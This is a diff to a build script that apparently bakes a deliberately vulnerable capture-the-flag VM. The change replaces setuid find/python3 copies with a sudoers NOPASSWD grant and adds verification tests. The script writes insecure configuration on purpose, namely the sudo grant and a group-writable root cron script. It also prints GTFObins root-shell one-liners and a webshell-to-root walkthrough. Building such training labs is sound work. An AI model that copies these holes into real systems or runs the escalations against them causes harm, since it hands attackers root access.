@@ -11,8 +11,8 @@
 #   -> admin panel -> file-upload webshell (weak extension filter) -> RCE as
 #   `saguarobot` (NO sudo) -> read the world-readable, passphrase-protected
 #   deploy key in /opt/saguaro/deploy -> crack it (ssh2john + rockyou) -> SSH
-#   as `hrivera` -> user flag -> root via a group-gated SUID find / SUID
-#   python3 copy, or a fieldops-writable root cronjob -> root flag.
+#   as `hrivera` -> user flag -> root via sudo NOPASSWD on find / python3
+#   (GTFObins), or a fieldops-writable root cronjob -> root flag.
 # Off the critical path: reflected XSS + SQLi on /research.php?q=.
 #
 # App source lives in the CyberCore repo at challenges/cybersaguaros-ssrf/. The
@@ -92,15 +92,17 @@ SSH_PASSWORD="${SSH_PASSWORD:-Sag-F1eld-Ops-2026!}"
 DEPLOY_KEY_PASSPHRASE="${DEPLOY_KEY_PASSPHRASE:-mariposa}"
 DEPLOY_DIR="${DEPLOY_DIR:-/opt/saguaro/deploy}"
 
-# $SSH_USER ONLY. Owns the setuid maintenance toolkit and the root cron script.
-# saguarobot must NEVER join it, or RCE short-circuits straight past the SSH
-# stage to root.
+# $SSH_USER ONLY. Carries the sudo NOPASSWD grant and owns the root cron
+# script. saguarobot must NEVER join it, or RCE short-circuits straight past
+# the SSH stage to root.
+#
+# Scoping the privesc through sudoers rather than a setuid bit is both the more
+# realistic vector (bad sudoers rules are the single highest-yield finding in a
+# real Linux engagement; an admin running `chmod u+s /usr/bin/find` is largely a
+# CTF trope) and the cleaner gate: per-user/per-group scoping is exactly what
+# sudoers is for, whereas setuid has none and needed an invented 4750 group
+# wrapper to keep saguarobot out.
 PRIV_GROUP="${PRIV_GROUP:-fieldops}"
-
-# The field-ops setuid maintenance toolkit. Deliberately NOT on the default
-# PATH, so the copies never shadow /usr/bin/find or /usr/bin/python3 for any
-# user; discovery is the canonical `find / -perm -4000 -type f 2>/dev/null`.
-SUID_DIR="${SUID_DIR:-/opt/saguaro/bin}"
 
 # Proof-of-ownership text files. Nothing in CyberCore validates these today
 # (crucible_score has no submission route), so they are read-and-show only.
@@ -236,6 +238,34 @@ packages:
   - php-mbstring
 
 write_files:
+  # ---- LinPE artifact: sudo NOPASSWD find + python3 for $PRIV_GROUP --------
+  # The primary privesc. Scoped to the %$PRIV_GROUP group, which holds
+  # $SSH_USER and nobody else — saguarobot is not a member, so the webshell
+  # foothold sees nothing from "sudo -l" and cannot skip the SSH stage.
+  #
+  # Because the matching entries are NOPASSWD, sudoers' listpw default of "any"
+  # means "sudo -l" prints them WITHOUT prompting for a password. That is the
+  # behaviour students expect, and it is why this reads as a discovery moment
+  # rather than a password wall.
+  #
+  # GTFObins escalation, as $SSH_USER (no -p and no setuid(0) needed here --
+  # unlike the setuid case, sudo already gives a real uid 0):
+  #   sudo find . -exec /bin/sh \; -quit
+  #   sudo python3 -c "import os; os.system('/bin/bash')"
+  #
+  # A syntax error in this file breaks sudo for EVERY user, so the bake runs
+  # visudo -c against it and refuses to seal if it does not parse.
+  - path: /etc/sudoers.d/fieldops-maint
+    permissions: '0440'
+    owner: root:root
+    content: |
+      # Field ops maintenance grant.
+      # Lets the on-call sysadmin run the nightly filesystem sweeps and the
+      # telemetry reindex without handing out a full root shell.
+      #   find    - nightly sweeps (see /opt/saguaro/field-sync.sh)
+      #   python3 - telemetry reindex tooling
+      %$PRIV_GROUP ALL=(root) NOPASSWD: /usr/bin/find, /usr/bin/python3
+
   # ---- LinPE artifact: root cron running a $PRIV_GROUP-writable script ------
   # Same shape as bake-dvwa-template.sh's /opt/maintenance.sh, except the write
   # bit is gated to $PRIV_GROUP rather than world-writable, so saguarobot cannot
@@ -316,8 +346,9 @@ write_files:
       #!/bin/sh
       # Challenge integrity guard — see 99-cybercore-default-user.cfg.
       # saguarobot must hold NO sudo at all: root is reachable only after
-      # pivoting to $SSH_USER via the deploy key, then using the group-gated
-      # setuid toolkit or the fieldops-writable root cronjob.
+      # pivoting to $SSH_USER via the deploy key, then using that account's
+      # own NOPASSWD grant or the fieldops-writable root cronjob.
+      # This removes ONLY cloud-init's artefacts -- never fieldops-maint.
       rm -f /etc/sudoers.d/90-cloud-init-users
       gpasswd -d saguarobot sudo >/dev/null 2>&1 || true
       exit 0
@@ -435,21 +466,12 @@ runcmd:
   # Ambient residue so the directory reads as lived-in rather than planted.
   - [ sh, -c, 'printf "%s\n" "2025-10-14 02:00:04 sync ok  (1.2 GiB, 41 files)" "2025-10-15 02:00:03 sync ok  (0.3 GiB, 12 files)" "2025-10-16 02:00:07 ssh: connect to host fieldstore.cybersaguaros.local port 22: No route to host" > $DEPLOY_DIR/field-sync.log; chmod 644 $DEPLOY_DIR/field-sync.log' ]
 
-  # ---- Artifact 2: field-ops setuid maintenance toolkit --------------------
-  # COPIES, never the real binaries: /usr/bin/find and /usr/bin/python3 stay
-  # 0755, and $SUID_DIR is off the default PATH, so nothing is shadowed for
-  # anyone. Only $PRIV_GROUP can execute these.
-  # NEVER use "ln" here — a hard link shares the inode and the setuid bit would
-  # land on /usr/bin/python3.13 itself. "cp" dereferences the symlink.
-  # GTFObins escalation, as $SSH_USER:
-  #   $SUID_DIR/find . -exec /bin/sh -p \; -quit
-  #   $SUID_DIR/python3 -c "import os;os.setuid(0);os.system('/bin/bash')"
-  # The -p and the explicit setuid(0) are required — both shells drop euid.
-  - [ sh, -c, 'mkdir -p $SUID_DIR' ]
-  - [ sh, -c, 'cp /usr/bin/find $SUID_DIR/find; cp /usr/bin/python3 $SUID_DIR/python3' ]
-  - [ sh, -c, 'chown root:$PRIV_GROUP $SUID_DIR/find $SUID_DIR/python3' ]
-  - [ sh, -c, 'chmod 4750 $SUID_DIR/find $SUID_DIR/python3' ]
-  - [ sh, -c, 'printf "%s\n" "Field ops maintenance helpers." "" "Setuid so the on-call team can run the nightly sweeps and the telemetry" "reindex without a sudo grant. Group-restricted to $PRIV_GROUP." "Do not add anything here without asking H. Rivera." > $SUID_DIR/README; chmod 644 $SUID_DIR/README' ]
+  # ---- Artifact 2: sudo NOPASSWD grant ------------------------------------
+  # The sudoers file itself is written by write_files above. Nothing to do here
+  # beyond the group membership set at the top of this block: the grant targets
+  # %$PRIV_GROUP, so joining the group IS the grant. /usr/bin/find and
+  # /usr/bin/python3 are left completely untouched at 0755 with no setuid bit —
+  # sudoers does all the scoping.
 
   # ---- Artifact 3: root cron on a $PRIV_GROUP-writable script --------------
   # /opt/saguaro itself stays 0755 root:root, so field-sync.sh can be modified
@@ -513,21 +535,29 @@ runcmd:
   # key authenticated — never a silent fallback to $SSH_USER's password.
   - [ sh, -c, 'cp $DEPLOY_DIR/id_rsa /tmp/bake-key; chmod 600 /tmp/bake-key; ssh-keygen -q -p -P "$DEPLOY_KEY_PASSPHRASE" -N "" -f /tmp/bake-key >/dev/null 2>&1; ssh -q -i /tmp/bake-key -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ConnectTimeout=10 $SSH_USER@127.0.0.1 id > /tmp/bake-key.out 2>&1; grep -q "$SSH_USER" /tmp/bake-key.out && echo "SSH_KEY_E2E=yes" >> /etc/cybercore-bake.env || echo "SSH_KEY_E2E=no" >> /etc/cybercore-bake.env; rm -f /tmp/bake-key /tmp/bake-key.out' ]
 
-  # SUID find: exact mode + owner + group.
-  - [ sh, -c, 'm=\$(stat -c "%a %U %G" $SUID_DIR/find 2>/dev/null); [ "\$m" = "4750 root $PRIV_GROUP" ] && echo "SUID_FIND=yes" >> /etc/cybercore-bake.env || echo "SUID_FIND=no (\$m)" >> /etc/cybercore-bake.env' ]
+  # Sudoers file parses. A syntax error here breaks sudo for EVERY user on the
+  # box, so this is checked before anything that depends on it.
+  - [ sh, -c, 'if /usr/sbin/visudo -cf /etc/sudoers.d/fieldops-maint >/dev/null 2>&1; then echo "SUDOERS_VALID=yes" >> /etc/cybercore-bake.env; else echo "SUDOERS_VALID=no" >> /etc/cybercore-bake.env; fi' ]
 
-  # SUID python3: an EXECUTION test, not a stat test. A copied CPython has to
-  # re-derive sys.prefix from its new argv[0]; printing 0 proves both euid==0
-  # and that the stdlib resolved from the new location.
-  - [ sh, -c, 'printf "import os\nprint(os.geteuid())\n" > /tmp/bake-euid.py; out=\$(su -s /bin/sh $SSH_USER -c "$SUID_DIR/python3 /tmp/bake-euid.py" 2>&1 | tr "\n" " "); rm -f /tmp/bake-euid.py; [ "\$out" = "0 " ] && echo "SUID_PYTHON=yes" >> /etc/cybercore-bake.env || echo "SUID_PYTHON=no (\$out)" >> /etc/cybercore-bake.env' ]
+  # "sudo -l" must LIST the grant without prompting. sudoers' listpw defaults to
+  # "any", so NOPASSWD entries are listable password-free; -n makes sudo fail
+  # rather than prompt, so a zero exit proves there is no password wall.
+  - [ sh, -c, 'if su -s /bin/sh $SSH_USER -c "sudo -n -l" >/dev/null 2>&1; then echo "SUDO_LIST=yes" >> /etc/cybercore-bake.env; else echo "SUDO_LIST=no" >> /etc/cybercore-bake.env; fi' ]
 
-  # NEGATIVE: the gate must hold against saguarobot, or the whole point of the
-  # group-restricted toolkit is unverified.
-  - [ sh, -c, 'if su -s /bin/sh saguarobot -c "$SUID_DIR/find /etc/hostname" >/dev/null 2>&1; then echo "SUID_GATED=no" >> /etc/cybercore-bake.env; else echo "SUID_GATED=yes" >> /etc/cybercore-bake.env; fi' ]
+  # EXECUTION tests, not stat tests: actually escalate and confirm uid 0.
+  # -n means a password prompt counts as failure, so these prove NOPASSWD works
+  # end to end for $SSH_USER.
+  - [ sh, -c, 'out=\$(su -s /bin/sh $SSH_USER -c "sudo -n find /etc/hostname -exec id -u \; " 2>&1 | tr -d " \n"); [ "\$out" = "0" ] && echo "SUDO_FIND=yes" >> /etc/cybercore-bake.env || echo "SUDO_FIND=no (\$out)" >> /etc/cybercore-bake.env' ]
+  - [ sh, -c, 'printf "import os\nprint(os.geteuid())\n" > /tmp/bake-euid.py; out=\$(su -s /bin/sh $SSH_USER -c "sudo -n python3 /tmp/bake-euid.py" 2>&1 | tr -d " \n"); rm -f /tmp/bake-euid.py; [ "\$out" = "0" ] && echo "SUDO_PYTHON=yes" >> /etc/cybercore-bake.env || echo "SUDO_PYTHON=no (\$out)" >> /etc/cybercore-bake.env' ]
 
-  # Guard against a future $SUID_DIR landing somewhere on PATH and shadowing
-  # /usr/bin for saguarobot's own enumeration.
-  - [ sh, -c, 'printf "python3 -c pass\nfind /etc/hostname\n" > /tmp/bake-bot.sh; if su -s /bin/sh saguarobot -c "sh /tmp/bake-bot.sh" >/dev/null 2>&1; then echo "BOT_TOOLS=yes" >> /etc/cybercore-bake.env; else echo "BOT_TOOLS=no" >> /etc/cybercore-bake.env; fi; rm -f /tmp/bake-bot.sh' ]
+  # NEGATIVE: the gate must hold against saguarobot. Without this the whole
+  # point of scoping the grant to %$PRIV_GROUP is unverified — if saguarobot
+  # can sudo, the webshell short-circuits straight to root.
+  - [ sh, -c, 'if su -s /bin/sh saguarobot -c "sudo -n find /etc/hostname -exec id -u \; " >/dev/null 2>&1; then echo "SUDO_GATED=no" >> /etc/cybercore-bake.env; else echo "SUDO_GATED=yes" >> /etc/cybercore-bake.env; fi' ]
+
+  # NEGATIVE: no stray setuid binaries outside the distro's own set. Catches a
+  # leftover /opt/saguaro/bin from an older bake of this template.
+  - [ sh, -c, 'n=\$(find /opt /home /usr/local -perm -4000 -type f 2>/dev/null | wc -l); [ "\$n" = "0" ] && echo "NO_STRAY_SUID=yes" >> /etc/cybercore-bake.env || echo "NO_STRAY_SUID=no (\$n)" >> /etc/cybercore-bake.env' ]
 
   # Cron artifact: present, writable by $SSH_USER, NOT writable by saguarobot.
   - [ sh, -c, 'if [ -f /etc/cron.d/saguaro-fieldsync ] && su -s /bin/sh $SSH_USER -c "test -w /opt/saguaro/field-sync.sh" && ! su -s /bin/sh saguarobot -c "test -w /opt/saguaro/field-sync.sh"; then echo "CRON_ARTIFACT=yes" >> /etc/cybercore-bake.env; else echo "CRON_ARTIFACT=no" >> /etc/cybercore-bake.env; fi' ]
@@ -653,10 +683,12 @@ else
       DEPLOY_KEY=$(get DEPLOY_KEY)
       KEY_ENCRYPTED=$(get KEY_ENCRYPTED)
       SSH_KEY_E2E=$(get SSH_KEY_E2E)
-      M_SUID_FIND=$(get SUID_FIND)
-      M_SUID_PY=$(get SUID_PYTHON)
-      M_SUID_GATED=$(get SUID_GATED)
-      M_BOT_TOOLS=$(get BOT_TOOLS)
+      M_SUDOERS_VALID=$(get SUDOERS_VALID)
+      M_SUDO_LIST=$(get SUDO_LIST)
+      M_SUDO_FIND=$(get SUDO_FIND)
+      M_SUDO_PY=$(get SUDO_PYTHON)
+      M_SUDO_GATED=$(get SUDO_GATED)
+      M_NO_STRAY_SUID=$(get NO_STRAY_SUID)
       M_CRON=$(get CRON_ARTIFACT)
       M_USER_FLAG=$(get USER_FLAG)
       M_ROOT_FLAG=$(get ROOT_FLAG)
@@ -675,10 +707,12 @@ else
       echo "    deploy key readable:  ${DEPLOY_KEY:-unknown}"
       echo "    key needs passphrase: ${KEY_ENCRYPTED:-unknown}"
       echo "    key -> SSH e2e:       ${SSH_KEY_E2E:-unknown}"
-      echo "    SUID find (gated):    ${M_SUID_FIND:-unknown}"
-      echo "    SUID python3 (gated): ${M_SUID_PY:-unknown}"
-      echo "    gate holds vs bot:    ${M_SUID_GATED:-unknown}"
-      echo "    bot can still enum:   ${M_BOT_TOOLS:-unknown}"
+      echo "    sudoers file parses:  ${M_SUDOERS_VALID:-unknown}"
+      echo "    sudo -l no prompt:    ${M_SUDO_LIST:-unknown}"
+      echo "    sudo find -> uid 0:   ${M_SUDO_FIND:-unknown}"
+      echo "    sudo python3 -> 0:    ${M_SUDO_PY:-unknown}"
+      echo "    gate holds vs bot:    ${M_SUDO_GATED:-unknown}"
+      echo "    no stray setuid:      ${M_NO_STRAY_SUID:-unknown}"
       echo "    root cron artifact:   ${M_CRON:-unknown}"
       echo "    user flag:            ${M_USER_FLAG:-unknown}"
       echo "    root flag:            ${M_ROOT_FLAG:-unknown}"
@@ -697,10 +731,12 @@ else
       [ "$DEPLOY_KEY" != "yes" ]   && { echo "ERROR: deploy key missing, not encrypted, or unreadable by saguarobot"; FAIL=1; }
       [ "$KEY_ENCRYPTED" != "yes" ] && { echo "ERROR: deploy key authenticates with NO passphrase — the cracking stage is skippable"; FAIL=1; }
       [ "$SSH_KEY_E2E" != "yes" ]  && { echo "ERROR: passphrase/pubkey/sshd mismatch — if OpenSSH rejected RSA-PEM, re-bake with -t ed25519"; FAIL=1; }
-      [ "$M_SUID_FIND" != "yes" ]  && { echo "ERROR: group-gated SUID find missing or wrong mode/owner"; FAIL=1; }
-      [ "$M_SUID_PY" != "yes" ]    && { echo "ERROR: SUID python3 did not run as euid 0 (copied interpreter may not resolve its stdlib)"; FAIL=1; }
-      [ "$M_SUID_GATED" != "yes" ] && { echo "ERROR: saguarobot CAN execute the SUID toolkit — the webshell short-circuits straight to root"; FAIL=1; }
-      [ "$M_BOT_TOOLS" != "yes" ]  && { echo "ERROR: saguarobot can no longer run find/python3 — SUID_DIR is shadowing /usr/bin on PATH"; FAIL=1; }
+      [ "$M_SUDOERS_VALID" != "yes" ] && { echo "ERROR: /etc/sudoers.d/fieldops-maint does not parse — sudo is broken for EVERY user on the box"; FAIL=1; }
+      [ "$M_SUDO_LIST" != "yes" ]  && { echo "ERROR: 'sudo -l' as $SSH_USER prompts or fails — the grant is not discoverable"; FAIL=1; }
+      [ "$M_SUDO_FIND" != "yes" ]  && { echo "ERROR: 'sudo find' did not run as uid 0 for $SSH_USER"; FAIL=1; }
+      [ "$M_SUDO_PY" != "yes" ]    && { echo "ERROR: 'sudo python3' did not run as uid 0 for $SSH_USER"; FAIL=1; }
+      [ "$M_SUDO_GATED" != "yes" ] && { echo "ERROR: saguarobot CAN sudo — the webshell short-circuits straight to root"; FAIL=1; }
+      [ "$M_NO_STRAY_SUID" != "yes" ] && { echo "ERROR: stray setuid binaries under /opt, /home or /usr/local (leftover from an older bake?)"; FAIL=1; }
       [ "$M_CRON" != "yes" ]       && { echo "ERROR: root cron artifact missing, or writable by the wrong account"; FAIL=1; }
       [ "$M_USER_FLAG" != "yes" ]  && { echo "ERROR: user.txt missing, wrong perms, or readable by saguarobot"; FAIL=1; }
       [ "$M_ROOT_FLAG" != "yes" ]  && { echo "ERROR: /root/root.txt missing, wrong perms, or readable by $SSH_USER"; FAIL=1; }
@@ -768,8 +804,9 @@ echo "                    chmod 600 id_rsa && ssh -i id_rsa $SSH_USER@<ip>"
 echo "  User flag:      /home/$SSH_USER/user.txt"
 echo "                    $USER_FLAG_VALUE"
 echo "  Root privesc:   any of these (all gated to group $PRIV_GROUP)"
-echo "                    $SUID_DIR/find . -exec /bin/sh -p \\; -quit"
-echo "                    $SUID_DIR/python3 -c 'import os;os.setuid(0);os.system(\"/bin/bash\")'"
+echo "                    sudo -l          # lists the grant, no password"
+echo "                    sudo find . -exec /bin/sh \\; -quit"
+echo "                    sudo python3 -c 'import os; os.system(\"/bin/bash\")'"
 echo "                    /opt/saguaro/field-sync.sh  (0775 root:$PRIV_GROUP,"
 echo "                      run by /etc/cron.d/saguaro-fieldsync every minute)"
 echo "  Root flag:      /root/root.txt"
